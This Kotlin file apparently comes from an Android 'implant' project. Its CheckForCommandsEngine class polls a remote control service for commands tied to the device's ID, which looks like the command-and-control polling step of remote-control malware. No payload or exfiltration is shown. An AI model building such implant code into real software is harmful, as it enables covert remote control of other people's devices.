package com.cooperthecoder.implant.jobs

import android.content.Context
import android.support.annotation.WorkerThread
import com.cooperthecoder.implant.App
import com.cooperthecoder.implant.data.DeviceProperties
import com.cooperthecoder.implant.model.Command

class CheckForCommandsEngine(context: Context) : Engine<Command> {
    companion object {
        val TAG = CheckForCommandsEngine::class.java.name
    }

    val app: App = context.applicationContext as App

    @WorkerThread
    override fun action(): Command? {
        val controlService = app.controlService
        val command = controlService.getCommands(DeviceProperties.deviceId(app)).execute()
        return command.body()
    }
}